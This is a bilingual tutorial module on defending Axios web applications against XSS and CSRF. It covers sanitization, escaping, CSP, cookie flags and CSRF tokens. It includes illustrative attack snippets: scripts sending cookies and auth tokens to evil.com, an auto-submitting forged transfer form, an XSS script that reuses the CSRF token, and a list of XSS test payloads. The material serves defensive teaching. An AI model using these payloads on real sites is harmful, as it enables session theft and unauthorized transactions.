# 🎯 Introdução

**XSS and CSRF Prevention** em Axios applications requer comprehensive defense-in-depth strategy combinando **input sanitization**, **output encoding**, **Content Security Policy**, **HttpOnly cookies**, **CSRF tokens**, **SameSite attributes**, ensuring neither malicious scripts can execute em application (XSS) nor forged requests can exploit authentication (CSRF), protecting users de data theft, session hijacking, e unauthorized actions.

XSS (Cross-Site Scripting) e CSRF (Cross-Site Request Forgery) são fundamentally different attack vectors: **XSS** injects malicious JavaScript into trusted site que executes em victim's browser com full access to same-origin resources (cookies, localStorage, DOM, making authenticated requests), enabling data theft, session hijacking, keylogging; **CSRF** tricks victim's browser into sending forged authenticated requests to trusted site sem JavaScript execution, enabling unauthorized actions (money transfers, password changes) mas cannot read responses.

Critical distinction: **XSS can bypass CSRF protection** porque malicious script executes on same origin, pode read CSRF tokens de cookies/DOM/headers e include em forged requests; CSRF protection alone insufficient se XSS vulnerabilities exist. Defense requires addressing BOTH: **XSS prevention** via input sanitization/output encoding/CSP preventing script injection, **CSRF prevention** via tokens/SameSite cookies preventing forged requests.

XSS attack types incluem: **Stored XSS** (malicious script stored em database - comments, profiles - executed quando other users view data), **Reflected XSS** (script em URL parameters immediately reflected em response - phishing links), **DOM-based XSS** (JavaScript manipulating DOM insecurely - innerHTML with user input). All require **executing JavaScript** em victim's browser context.

XSS prevention patterns: **Input sanitization** (removing/escaping dangerous characters before storage - `<script>` → `&lt;script&gt;`), **Output encoding** (escaping data quando rendering - HTML entity encoding, JavaScript escaping, URL encoding), **Content Security Policy** (HTTP header restricting resource sources - `script-src 'self'` blocks inline scripts/external scripts), **HttpOnly cookies** (preventing JavaScript access - `document.cookie` cannot read HttpOnly cookies), **Validation** (rejecting invalid input patterns).

CSRF prevention patterns (covered em detail anterior module): **CSRF tokens** (server-generated random tokens included em requests, validated on server), **SameSite cookies** (`SameSite=Strict/Lax` preventing cookie sending cross-site), **Origin/Referer validation** (checking request origin matches expected domain), **Custom headers** (requiring headers like `X-Requested-With` that simple HTML forms cannot set).

Axios-specific considerations: **Request data sanitization** (sanitizing data BEFORE sending via Axios - preventing injection at source), **Response data handling** (escaping data received FROM Axios before rendering - preventing stored XSS), **CSP compatibility** (Axios works com strict CSP - no eval, no inline scripts), **Token management** (secure storage/transmission de auth/CSRF tokens).

Common XSS vectors em Axios applications: **Rendering API responses** (displaying user-generated content sem encoding - `<div>{response.data.comment}</div>` executes `<script>`), **URL construction** (building URLs com user input - `axios.get('/search?q=' + userInput)` vulnerable to injection), **Dynamic HTML insertion** (innerHTML/dangerouslySetInnerHTML with API data), **Event handlers** (onclick with user data - `onclick="${userData}"` injectable).

Defense-in-depth principles: **Never trust client input** (validate/sanitize all user input), **Never trust API responses** (treat as potentially malicious - sanitize before rendering), **Escape context-appropriately** (HTML escaping para HTML context, JavaScript escaping para JS context, URL encoding para URLs), **Use framework protections** (React auto-escapes JSX, Vue escapes templates), **Implement CSP** (blocks inline scripts even if injection occurs), **HttpOnly + Secure + SameSite cookies** (minimize attack surface).

Testing strategies incluem: **XSS payload testing** (`<script>alert('XSS')</script>`, `<img src=x onerror=alert('XSS')>`, `javascript:alert('XSS')`), **CSRF attack simulation** (creating malicious forms/requests de different origin), **CSP violation monitoring** (logging CSP violations para detecting attempted attacks), **Automated scanning** (tools like OWASP ZAP, Burp Suite detecting vulnerabilities).

Advanced patterns: **Trusted Types** (browser API requiring sanitization before DOM insertion), **Subresource Integrity** (verifying CDN resources não tampered - `<script src=cdn integrity=hash>`), **Nonce-based CSP** (allowing inline scripts with unique nonces), **Sanitization libraries** (DOMPurify para HTML sanitization, validator.js para input validation).

Este módulo explora comprehensive XSS/CSRF prevention: desde attack fundamentals (XSS types, CSRF mechanics), através de prevention techniques (input sanitization, output encoding, CSP, tokens), Axios-specific patterns (request sanitization, response handling), até advanced protections (Trusted Types, SRI, nonce CSP). Objetivo é fornecer complete security posture protecting contra both XSS e CSRF attacks.

---

# 📋 Sumário

### **XSS Attack Fundamentals**
- What is XSS
- Stored XSS
- Reflected XSS
- DOM-based XSS

### **XSS Prevention**
- Input sanitization
- Output encoding
- Content Security Policy
- HttpOnly cookies

### **CSRF Recap**
- CSRF mechanics
- Token-based protection
- SameSite cookies
- Origin validation

### **XSS vs CSRF**
- Attack differences
- Protection differences
- XSS bypassing CSRF
- Defense-in-depth

### **Axios Security Patterns**
- Request sanitization
- Response handling
- URL construction
- Header security

### **Framework Protections**
- React (JSX auto-escape)
- Vue (template escaping)
- Angular (sanitization)
- Manual escaping

### **CSP Implementation**
- CSP headers
- Directive configuration
- Nonce-based CSP
- Violation reporting

### **Advanced Protections**
- Trusted Types
- Subresource Integrity
- Sanitization libraries
- Security testing

---

# 🧠 Fundamentos

## XSS Attack Fundamentals

### **What is XSS**

**Cross-Site Scripting definition**:

Vulnerability onde attacker injects malicious JavaScript into trusted website, script executes em victim's browser com full access to same-origin resources (cookies, localStorage, DOM), enabling data theft, session hijacking, keylogging, malware distribution.

**Attack flow**:

```
1. Attacker injects malicious script into vulnerable site
   → Comment: "Great post! <script>stealCookies()</script>"

2. Victim visits page displaying comment

3. Malicious script executes in victim's browser
   → Accesses cookies: document.cookie
   → Sends to attacker: fetch('https://evil.com/steal?data=' + document.cookie)

4. Attacker receives victim's session cookie
   → Can impersonate victim
```

### **Stored XSS**

**Persistent XSS**:

Malicious script stored em database (comments, profiles, posts), executed whenever other users view infected data.

**Example attack**:

```javascript
// Attacker submits comment
const maliciousComment = `
  Great article!
  <script>
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage.getItem('auth_token')
      })
    });
  </script>
`;

axios.post('/api/comments', {
  content: maliciousComment
});

// Vulnerable backend stores without sanitization
await db.comments.create({ content: maliciousComment });

// Vulnerable frontend renders without encoding
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(c => (
        <div dangerouslySetInnerHTML={{ __html: c.content }} />
        // ❌ Executes malicious script!
      ))}
    </div>
  );
}

// All users viewing comments → script executes → data stolen
```

### **Reflected XSS**

**Non-persistent XSS**:

Malicious script em URL/request parameters immediately reflected em response, não stored. Requires tricking victim into clicking malicious link.

**Example attack**:

```javascript
// Attacker creates malicious link
const maliciousUrl = `
  https://example.com/search?q=<script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>
`;

// Victim clicks link (e.g., from phishing email)

// Vulnerable backend reflects query in response
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Search results for: ${query}</h1>`);
  // ❌ Reflects unsanitized input → script executes
});

// Page renders:
// <h1>Search results for: <script>fetch(...)</script></h1>
// Script executes, steals cookies
```

### **DOM-based XSS**

**Client-side XSS**:

Vulnerability em client-side JavaScript manipulating DOM com user input, sem server involvement.

**Example attack**:

```javascript
// Vulnerable code
const urlParams = new URLSearchParams(window.location.search);
const username = urlParams.get('username');

document.getElementById('greeting').innerHTML = `Welcome ${username}!`;
// ❌ innerHTML with unsanitized input

// Attacker crafts URL:
// https://example.com/profile?username=<img src=x onerror=alert(document.cookie)>

// Rendered DOM:
// <div id="greeting">Welcome <img src=x onerror=alert(document.cookie)>!</div>
// onerror handler executes, runs malicious code
```

**Common DOM XSS sinks**:

```javascript
// ❌ Dangerous DOM operations with user input:

// innerHTML
element.innerHTML = userInput; // Executes <script>, <img onerror>, etc.

// document.write
document.write(userInput); // Injects arbitrary HTML/JS

// eval
eval(userInput); // Executes arbitrary JavaScript

// setTimeout/setInterval with strings
setTimeout(userInput, 1000); // Executes as JavaScript

// location
location = 'javascript:' + userInput; // Executes JavaScript

// onclick/onerror
element.setAttribute('onclick', userInput); // Event handler injection
```

## XSS Prevention

### **Input Sanitization**

**Sanitize BEFORE storage**:

```javascript
// Backend sanitization
const sanitizeHtml = require('sanitize-html');

app.post('/api/comments', async (req, res) => {
  const rawComment = req.body.content;
  
  // Remove dangerous tags/attributes
  const sanitizedComment = sanitizeHtml(rawComment, {
    allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
    allowedAttributes: {}
  });
  
  // Store sanitized version
  await db.comments.create({ content: sanitizedComment });
  
  res.json({ success: true });
});

// Input: "Hello <script>alert('XSS')</script>"
// Stored: "Hello " (script removed)
```

**Axios request sanitization**:

```javascript
// Sanitize before sending
import sanitizeHtml from 'sanitize-html';

const userInput = getFormData();

axios.post('/api/comments', {
  content: sanitizeHtml(userInput, {
    allowedTags: ['b', 'i', 'p'],
    allowedAttributes: {}
  })
});
```

**Validation patterns**:

```javascript
// Whitelist validation
function validateUsername(username) {
  // Allow only alphanumeric + underscore
  const pattern = /^[a-zA-Z0-9_]+$/;
  
  if (!pattern.test(username)) {
    throw new Error('Invalid username format');
  }
  
  return username;
}

// Email validation
function validateEmail(email) {
  const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  
  if (!pattern.test(email)) {
    throw new Error('Invalid email format');
  }
  
  return email;
}

// Usage
axios.post('/api/users', {
  username: validateUsername(userInput.username),
  email: validateEmail(userInput.email)
});
```

### **Output Encoding**

**Escape BEFORE rendering**:

```javascript
// HTML entity encoding
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Usage
const userComment = "<script>alert('XSS')</script>";
const safeComment = escapeHtml(userComment);
// Result: "&lt;script&gt;alert('XSS')&lt;/script&gt;"

document.getElementById('comment').textContent = safeComment;
// Displayed as text, not executed as HTML
```

**React auto-escaping**:

```javascript
// ✅ React automatically escapes
function Comment({ text }) {
  return <div>{text}</div>;
  // Input: "<script>alert('XSS')</script>"
  // Rendered: "&lt;script&gt;alert('XSS')&lt;/script&gt;" (safe)
}

// ❌ dangerouslySetInnerHTML bypasses escaping
function UnsafeComment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // Input: "<script>alert('XSS')</script>"
  // Rendered: <script>alert('XSS')</script> (EXECUTES!)
}
```

**Context-appropriate escaping**:

```javascript
// HTML context
const htmlEscaped = escapeHtml(userInput);
element.textContent = htmlEscaped;

// JavaScript context
const jsEscaped = JSON.stringify(userInput);
const script = `<script>var data = ${jsEscaped};</script>`;

// URL context
const urlEncoded = encodeURIComponent(userInput);
const url = `/search?q=${urlEncoded}`;

// CSS context (avoid user input in CSS)
// ❌ Never: style="color: ${userInput}"
```

### **Content Security Policy**

**CSP header blocking inline scripts**:

```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', `
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
  `.replace(/\s+/g, ' ').trim());
  
  next();
});

// Blocks:
// ❌ <script>alert('XSS')</script> (inline script)
// ❌ <script src="https://evil.com/malicious.js"></script> (external script)
// ❌ onclick="alert('XSS')" (inline event handler)

// Allows:
// ✅ <script src="/js/app.js"></script> (same-origin script)
```

**CSP directives**:

```javascript
// script-src: Controls script sources
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com

// style-src: Controls stylesheet sources
style-src 'self' 'unsafe-inline'

// img-src: Controls image sources
img-src 'self' data: https:

// connect-src: Controls AJAX/WebSocket/Fetch sources
connect-src 'self' https://api.example.com

// default-src: Fallback for unspecified directives
default-src 'self'

// frame-ancestors: Controls embedding in iframes
frame-ancestors 'none'
```

**Nonce-based CSP** (allowing specific inline scripts):

```javascript
// Generate unique nonce per request
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  
  res.setHeader('Content-Security-Policy', `
    script-src 'self' 'nonce-${nonce}';
  `);
  
  next();
});

// HTML template
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <script nonce="${res.locals.nonce}">
          // ✅ Allowed (has correct nonce)
          console.log('Allowed inline script');
        </script>
        
        <script>
          // ❌ Blocked (no nonce)
          alert('Blocked');
        </script>
      </head>
    </html>
  `);
});
```

### **HttpOnly Cookies**

**Preventing JavaScript access to cookies**:

```javascript
// Backend sets HttpOnly cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,  // ✅ Cannot be accessed by JavaScript
  secure: true,    // HTTPS only
  sameSite: 'strict'
});

// Frontend CANNOT access
console.log(document.cookie); // Does NOT include sessionId

// Even if XSS occurs:
fetch('https://evil.com/steal?cookie=' + document.cookie);
// sessionId NOT included in stolen data

// ❌ Non-HttpOnly cookie (vulnerable)
res.cookie('authToken', token, {
  httpOnly: false // JavaScript CAN access
});

// XSS can steal:
console.log(document.cookie); // Includes authToken
```

## CSRF Recap

### **CSRF Mechanics**

**Automatic cookie transmission exploitation**:

```javascript
// User logged into bank.com (cookie: sessionId=abc123)

// Attacker site evil.com:
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

// Browser automatically includes cookie:
POST /transfer
Cookie: sessionId=abc123
Body: to=attacker-account&amount=10000

// Bank processes authenticated request
```

### **Token-Based Protection**

**CSRF token validation**:

```javascript
// Server generates token
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;
res.cookie('XSRF-TOKEN', csrfToken);

// Axios includes token automatically
axios.post('/transfer', { amount: 100 });
// Headers: X-XSRF-TOKEN: abc123...

// Server validates
if (req.headers['x-xsrf-token'] !== req.session.csrfToken) {
  return res.status(403).json({ error: 'Invalid CSRF token' });
}
```

### **SameSite Cookies**

**Preventing cross-site cookie sending**:

```javascript
res.cookie('sessionId', sessionId, {
  sameSite: 'strict', // Cookie NOT sent on cross-site requests
  secure: true,
  httpOnly: true
});

// Same-site request: Cookie sent ✅
// Cross-site request: Cookie NOT sent ❌
```

### **Origin Validation**

**Checking request origin**:

```javascript
app.use((req, res, next) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://app.example.com'];
  
  if (req.method !== 'GET' && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  next();
});
```

## XSS vs CSRF

### **Attack Differences**

**XSS**:
- Injects malicious JavaScript into trusted site
- Script executes on same origin (full access)
- Can read cookies, tokens, DOM, localStorage
- Can make authenticated requests
- Can log keystrokes, steal data
- Requires JavaScript execution

**CSRF**:
- Forges requests from malicious site to trusted site
- Cannot execute JavaScript on trusted site
- Cannot read cookies/tokens (Same-Origin Policy)
- Can only trigger actions, not read responses
- Exploits automatic cookie transmission
- Does NOT require JavaScript execution on target

### **Protection Differences**

**XSS protection**:

```javascript
// Input sanitization
const clean = sanitizeHtml(userInput);

// Output encoding
const escaped = escapeHtml(data);

// Content Security Policy
res.setHeader('Content-Security-Policy', "script-src 'self'");

// HttpOnly cookies
res.cookie('sessionId', id, { httpOnly: true });
```

**CSRF protection**:

```javascript
// CSRF tokens
app.use(csrf({ cookie: true }));

// SameSite cookies
res.cookie('sessionId', id, { sameSite: 'strict' });

// Origin validation
if (origin !== 'https://app.example.com') reject();

// Custom headers
if (!req.headers['x-requested-with']) reject();
```

### **XSS Bypassing CSRF**

**XSS can bypass CSRF protection**:

```javascript
// CSRF protection in place
app.use(csrf({ cookie: true }));

// XSS vulnerability exists
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// Attacker injects:
const maliciousComment = `
  <script>
    // Script executes on same origin
    // Can read CSRF token
    const csrfToken = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
    
    // Makes authenticated request WITH token
    fetch('/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-XSRF-TOKEN': csrfToken // CSRF protection bypassed!
      },
      body: JSON.stringify({ to: 'attacker', amount: 10000 })
    });
  </script>
`;

// CSRF protection useless against XSS
```

### **Defense-in-Depth**

**Layered security approach**:

```javascript
// Layer 1: XSS Prevention
// - Input sanitization
const clean = sanitizeHtml(userInput);

// - Output encoding (React auto-escapes)
<div>{data}</div>

// - CSP
res.setHeader('Content-Security-Policy', "script-src 'self'");

// Layer 2: CSRF Prevention
// - Tokens
app.use(csrf({ cookie: true }));

// - SameSite cookies
res.cookie('sessionId', id, { sameSite: 'strict' });

// Layer 3: Cookie Security
// - HttpOnly (prevents JS access)
// - Secure (HTTPS only)
// - SameSite (prevents cross-site sending)
res.cookie('sessionId', id, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// Layer 4: Input Validation
// - Whitelist validation
// - Type checking
// - Length limits

// Layer 5: Output Encoding
// - HTML escaping
// - JavaScript escaping
// - URL encoding

// All layers combined provide robust protection
```

## Axios Security Patterns

### **Request Sanitization**

**Sanitize data before sending**:

```javascript
import sanitizeHtml from 'sanitize-html';
import validator from 'validator';

// Sanitize HTML content
const sanitizedContent = sanitizeHtml(userInput.content, {
  allowedTags: ['b', 'i', 'p', 'br'],
  allowedAttributes: {}
});

// Validate email
const email = validator.isEmail(userInput.email) 
  ? userInput.email 
  : null;

// Validate URL
const website = validator.isURL(userInput.website)
  ? userInput.website
  : null;

// Send sanitized data
axios.post('/api/profile', {
  content: sanitizedContent,
  email: email,
  website: website
});
```

**Interceptor-based sanitization**:

```javascript
axios.interceptors.request.use(config => {
  // Sanitize all string fields in request body
  if (config.data && typeof config.data === 'object') {
    Object.keys(config.data).forEach(key => {
      if (typeof config.data[key] === 'string') {
        config.data[key] = sanitizeHtml(config.data[key], {
          allowedTags: [],
          allowedAttributes: {}
        });
      }
    });
  }
  
  return config;
});
```

### **Response Handling**

**Escape responses before rendering**:

```javascript
// Fetch data
const response = await axios.get('/api/comments');

// ❌ Dangerous: Rendering without escaping
comments.forEach(c => {
  div.innerHTML = c.content; // Executes scripts!
});

// ✅ Safe: React auto-escapes
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(c => (
        <p key={c.id}>{c.content}</p>
        // Auto-escaped by React
      ))}
    </div>
  );
}

// ✅ Safe: Manual escaping
comments.forEach(c => {
  const escaped = escapeHtml(c.content);
  div.textContent = escaped; // Displayed as text
});
```

**Response validation**:

```javascript
// Validate response structure
axios.get('/api/user')
  .then(response => {
    const user = response.data;
    
    // Validate expected fields
    if (typeof user.id !== 'number') {
      throw new Error('Invalid user ID');
    }
    
    if (typeof user.name !== 'string') {
      throw new Error('Invalid user name');
    }
    
    // Sanitize before using
    const safeName = escapeHtml(user.name);
    
    return { ...user, name: safeName };
  });
```

### **URL Construction**

**Safe URL building**:

```javascript
// ❌ Dangerous: Concatenation with user input
const query = userInput;
axios.get('/search?q=' + query); // Vulnerable to injection

// ✅ Safe: Use params option
axios.get('/search', {
  params: {
    q: userInput // Automatically URL-encoded
  }
});

// ❌ Dangerous: Template literals
const userId = userInput;
axios.get(`/users/${userId}`); // Vulnerable to path traversal

// ✅ Safe: Validation + encoding
function getUserById(id) {
  // Validate ID is number
  const numericId = parseInt(id, 10);
  if (isNaN(numericId)) {
    throw new Error('Invalid ID');
  }
  
  return axios.get(`/users/${numericId}`);
}
```

### **Header Security**

**Secure header handling**:

```javascript
// ❌ Dangerous: User input in headers
axios.get('/api/data', {
  headers: {
    'X-Custom': userInput // Vulnerable to header injection
  }
});

// ✅ Safe: Validate/sanitize header values
function setCustomHeader(value) {
  // Remove newlines (prevent header injection)
  const sanitized = value.replace(/[\r\n]/g, '');
  
  return axios.get('/api/data', {
    headers: {
      'X-Custom': sanitized
    }
  });
}

// ✅ Safe: Whitelist allowed values
const allowedValues = ['option1', 'option2', 'option3'];

if (allowedValues.includes(userInput)) {
  axios.get('/api/data', {
    headers: {
      'X-Option': userInput
    }
  });
}
```

## Framework Protections

### **React (JSX Auto-Escape)**

**Automatic escaping**:

```javascript
// ✅ Auto-escaped by React
function UserProfile({ user }) {
  return (
    <div>
      <h1>{user.name}</h1>
      <p>{user.bio}</p>
    </div>
  );
}

// Input: { name: "<script>alert('XSS')</script>" }
// Output: "&lt;script&gt;alert('XSS')&lt;/script&gt;" (safe)
```

**DOMPurify for HTML content**:

```javascript
import DOMPurify from 'dompurify';

function RichTextContent({ html }) {
  const sanitized = DOMPurify.sanitize(html);
  
  return (
    <div dangerouslySetInnerHTML={{ __html: sanitized }} />
  );
}
```

### **Vue (Template Escaping)**

**Automatic escaping**:

```vue
<template>
  <!-- ✅ Auto-escaped by Vue -->
  <div>{{ user.name }}</div>
  <p>{{ user.bio }}</p>
  
  <!-- ❌ v-html bypasses escaping -->
  <div v-html="user.bio"></div>
  
  <!-- ✅ Sanitize before v-html -->
  <div v-html="sanitize(user.bio)"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  methods: {
    sanitize(html) {
      return DOMPurify.sanitize(html);
    }
  }
};
</script>
```

### **Angular (Sanitization)**

**Built-in sanitization**:

```typescript
import { DomSanitizer } from '@angular/platform-browser';

@Component({
  selector: 'user-profile',
  template: `
    <!-- ✅ Auto-escaped by Angular -->
    <div>{{ user.name }}</div>
    
    <!-- ❌ Bypasses sanitization -->
    <div [innerHTML]="user.bio"></div>
    
    <!-- ✅ Sanitized HTML -->
    <div [innerHTML]="sanitizedBio"></div>
  `
})
export class UserProfileComponent {
  sanitizedBio: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {}
  
  ngOnInit() {
    this.sanitizedBio = this.sanitizer.sanitize(
      SecurityContext.HTML, 
      this.user.bio
    );
  }
}
```

### **Manual Escaping**

**Vanilla JavaScript**:

```javascript
function escapeHtml(unsafe) {
  const div = document.createElement('div');
  div.textContent = unsafe;
  return div.innerHTML;
}

// Usage
const userInput = "<script>alert('XSS')</script>";
const safe = escapeHtml(userInput);
// Result: "&lt;script&gt;alert('XSS')&lt;/script&gt;"

document.getElementById('content').innerHTML = safe;
```

## CSP Implementation

### **CSP Headers**

**Strict CSP**:

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self'",
    "img-src 'self' data: https:",
    "font-src 'self'",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'"
  ].join('; '));
  
  next();
});
```

### **Directive Configuration**

**Production CSP**:

```javascript
const csp = {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.example.com"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"]
  }
};

app.use(helmet.contentSecurityPolicy(csp));
```

### **Nonce-Based CSP**

**Dynamic nonce generation**:

```javascript
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', `
    script-src 'self' 'nonce-${res.locals.nonce}';
  `);
  next();
});

// Template
<script nonce="<%= nonce %>">
  // Allowed
</script>
```

### **Violation Reporting**

**CSP violation logging**:

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', `
    default-src 'self';
    report-uri /csp-violation-report;
  `);
  next();
});

app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.error('CSP Violation:', req.body);
  // Log to monitoring service
  res.status(204).end();
});
```

## Advanced Protections

### **Trusted Types**

**Preventing DOM XSS**:

```javascript
// Enable Trusted Types via CSP
res.setHeader('Content-Security-Policy', `
  require-trusted-types-for 'script';
  trusted-types default;
`);

// Create policy
const policy = trustedTypes.createPolicy('default', {
  createHTML: (string) => {
    return DOMPurify.sanitize(string);
  }
});

// Usage
element.innerHTML = policy.createHTML(userInput);
// Sanitized automatically
```

### **Subresource Integrity**

**Verify CDN resources**:

```html
<!-- CDN script with integrity check -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-hash..."
  crossorigin="anonymous">
</script>

<!-- If hash doesn't match, script blocked -->
```

### **Sanitization Libraries**

**DOMPurify**:

```javascript
import DOMPurify from 'dompurify';

const dirty = '<script>alert("XSS")</script><p>Safe content</p>';
const clean = DOMPurify.sanitize(dirty);
// Result: '<p>Safe content</p>'
```

**validator.js**:

```javascript
import validator from 'validator';

// Validate input
const isValidEmail = validator.isEmail(input.email);
const isValidURL = validator.isURL(input.website);
const isValidUUID = validator.isUUID(input.id);

// Escape for safety
const escaped = validator.escape(input.text);
```

### **Security Testing**

**XSS payload testing**:

```javascript
const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  'javascript:alert("XSS")',
  '<svg onload=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  "'-alert('XSS')-'",
  '<iframe src="javascript:alert(\'XSS\')">',
  '<body onload=alert("XSS")>'
];

// Test each payload
xssPayloads.forEach(payload => {
  axios.post('/api/comment', { content: payload })
    .then(response => {
      // Verify payload was sanitized
      assert(!response.data.content.includes('<script>'));
    });
});
```

---

# 🎯 Aplicabilidade

## Quando Implementar XSS/CSRF Protection

**All Web Applications**: XSS/CSRF vulnerabilities affect todas aplicações web.

**User-Generated Content**: Comments, profiles, posts requiring sanitization.

**Authenticated Applications**: CSRF protection essential para authenticated endpoints.

## Trade-offs

**Sanitization Overhead**: Slight performance cost (negligible).

**CSP Compatibility**: Strict CSP pode break inline scripts (refactor needed).

**Development Complexity**: Security adds complexity mas essential.

---

# ⚠️ Limitações

## Zero-Day Vulnerabilities

New attack vectors constantly discovered.

**Solution**: Defense-in-depth, regular updates, monitoring.

## Framework Bypasses

Frameworks não foolproof - developers can bypass protections.

**Solution**: Code reviews, security training, automated scanning.

---

# 🔗 Interconexões

## Authentication

XSS can steal auth tokens, CSRF can abuse authentication.

## Input Validation

First line of defense against XSS.

## HTTPS

Essential para cookie security (Secure attribute).

---

# 🚀 Evolução

## Trusted Types

Browser-enforced sanitization preventing DOM XSS.

## Isolation APIs

Origin isolation, COOP, COEP limiting attack impact.

## Security Headers

Additional headers (Permissions-Policy, etc.) restricting capabilities.

---

**Conclusão Integrada**: XSS/CSRF prevention requer comprehensive defense-in-depth strategy combinando input sanitization, output encoding, Content Security Policy, HttpOnly cookies, CSRF tokens, SameSite attributes protecting contra script injection (XSS) e forged requests (CSRF). **XSS attack types**: **Stored XSS** (malicious script stored em database executed quando users view data - comments, profiles), **Reflected XSS** (script em URL parameters immediately reflected em response - phishing links), **DOM-based XSS** (client-side JavaScript manipulating DOM insecurely - innerHTML with user input). **XSS prevention**: **input sanitization** removing dangerous tags/attributes before storage (sanitize-html, DOMPurify), **output encoding** escaping data quando rendering (HTML entities, React auto-escape JSX, Vue escapes templates), **Content Security Policy** blocking inline scripts via `script-src 'self'` header, **HttpOnly cookies** preventing JavaScript access via `document.cookie`. **CSRF mechanics**: automatic cookie transmission enabling forged requests de malicious sites, **token-based protection** validating unique tokens generated server-side included em requests, **SameSite cookies** preventing cross-site cookie sending via `SameSite=Strict/Lax`, **Origin validation** checking request Origin header matching expected domain. **XSS vs CSRF distinction**: XSS injects scripts em target site reading cookies/tokens/DOM same-origin (prevented via sanitization/CSP), CSRF forges requests de attacker site exploiting automatic cookies (prevented via tokens/SameSite), **XSS can bypass CSRF** (same-origin scripts read CSRF tokens making forged requests with valid tokens). **Axios security patterns**: **request sanitization** cleaning data before sending via sanitizeHtml/validator, **response handling** escaping API responses before rendering (React auto-escape, manual escapeHtml), **URL construction** using params option preventing injection (axios.get('/search', { params: { q: userInput } })), **header security** validating/sanitizing header values removing newlines. **Framework protections**: **React** auto-escapes JSX (dangerouslySetInnerHTML bypasses - use DOMPurify first), **Vue** auto-escapes templates (v-html bypasses - sanitize first), **Angular** built-in sanitization (innerHTML requires DomSanitizer). **CSP implementation**: **strict CSP** blocking inline scripts/external domains (`script-src 'self'`), **nonce-based CSP** allowing specific inline scripts with unique nonces, **violation reporting** logging attempted attacks via report-uri directive. **Advanced protections**: **Trusted Types** browser API requiring sanitization before DOM insertion, **Subresource Integrity** verifying CDN resources não tampered via integrity hash, **sanitization libraries** (DOMPurify for HTML, validator.js for input validation). **Defense-in-depth layers**: input sanitization (sanitize-html removing dangerous tags), output encoding (escaping before rendering), CSP (blocking inline scripts even if injection occurs), HttpOnly cookies (preventing JS access), CSRF tokens (validating request origin), SameSite cookies (preventing cross-site sending), input validation (whitelisting allowed patterns), security testing (automated scanning, payload testing). Critical understanding: XSS e CSRF require different protections (XSS prevented via sanitization/encoding/CSP, CSRF via tokens/SameSite); XSS can bypass CSRF protection requiring both addressed; frameworks provide auto-escaping mas developers can bypass (dangerouslySetInnerHTML, v-html); CSP provides defense-in-depth blocking scripts even when injection occurs; HttpOnly+Secure+SameSite cookies minimize attack surface; comprehensive testing essential validating protections effective.